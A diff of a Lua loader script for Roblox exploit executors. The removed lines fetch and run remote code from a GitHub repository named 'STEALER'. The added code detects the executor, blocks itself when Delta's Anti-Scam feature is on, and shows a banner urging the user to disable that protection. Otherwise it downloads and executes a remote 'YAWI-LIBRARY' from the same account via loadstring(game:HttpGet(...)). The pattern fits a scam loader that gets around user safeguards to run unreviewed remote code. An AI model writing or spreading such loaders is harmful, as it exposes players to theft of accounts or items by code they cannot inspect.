@@ -1,2 +1,88 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GagDeveloper/STEALER/refs/heads/main/Protected_5220150435470047.lua.txt"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GagDeveloper/YAWI-LIBRARY/refs/heads/main/YAWILIBRARY"))()
+-- Executor Detector Function
+if type(detectExecutor) ~= "function" then
+    function detectExecutor()
+        if syn then
+            return "Synapse"
+        elseif KRNL then
+            return "KRNL"
+        elseif Fluxus then
+            return "Fluxus"
+        elseif Protosmasher then
+            return "Protosmasher"
+        elseif (ArceusX ~= nil) or (Arceus ~= nil) then
+            return "Arceus X"
+        elseif Delta then
+            return "Delta"
+        else
+            return "Unknown"
+        end
+    end
+end
+
+-- Function to create a warning GUI
+local function showWarning(msg)
+    local ScreenGui = Instance.new("ScreenGui")
+    local Frame = Instance.new("Frame")
+    local TextLabel = Instance.new("TextLabel")
+
+    ScreenGui.Parent = game:GetService("CoreGui")
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    Frame.Parent = ScreenGui
+    Frame.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
+    Frame.Size = UDim2.new(0, 400, 0, 100)
+    Frame.Position = UDim2.new(0.5, -200, 0.1, 0)
+    Frame.BorderSizePixel = 0
+    Frame.BackgroundTransparency = 0.1
+
+    TextLabel.Parent = Frame
+    TextLabel.Text = msg
+    TextLabel.Size = UDim2.new(1, 0, 1, 0)
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.BackgroundTransparency = 1
+    TextLabel.TextScaled = true
+    TextLabel.Font = Enum.Font.SourceSansBold
+end
+
+-- Script URL (YAWI only)
+local yawiScript = "https://raw.githubusercontent.com/GagDeveloper/YAWI-LIBRARY/refs/heads/main/YAWILIBRARY"
+
+-- Function to safely load a script
+local function safeLoad(url)
+    local ok, result = pcall(function()
+        return loadstring(game:HttpGet(url))()
+    end)
+    if not ok then
+        warn("❌ Failed to load script from " .. url .. " : " .. tostring(result))
+    else
+        print("✅ Loaded: " .. url)
+    end
+end
+
+-- Executor detection
+local exec = detectExecutor()
+print("🛠️ Executor Detected: " .. exec)
+
+-- Check if Delta
+if exec == "Delta" then
+    local antiScamOn = false
+    pcall(function()
+        if getgenv and getgenv().DeltaAntiScam then
+            antiScamOn = true
+        end
+    end)
+
+    if antiScamOn then
+        -- Anti-Scam ON = warning only
+        warn("⚠️ Delta Anti-Scam is ON! Script blocked.")
+        showWarning("⚠️ Delta Anti-Scam is ON!\nDisable it to run the script.")
+    else
+        -- Anti-Scam OFF = load YAWI only
+        print("✅ Delta detected, Anti-Scam OFF. Loading YAWI-LIBRARY...")
+        safeLoad(yawiScript)
+    end
+else
+    -- Other executors = YAWI only
+    print("✅ Non-Delta executor detected. Loading YAWI-LIBRARY...")
+    safeLoad(yawiScript)
+end
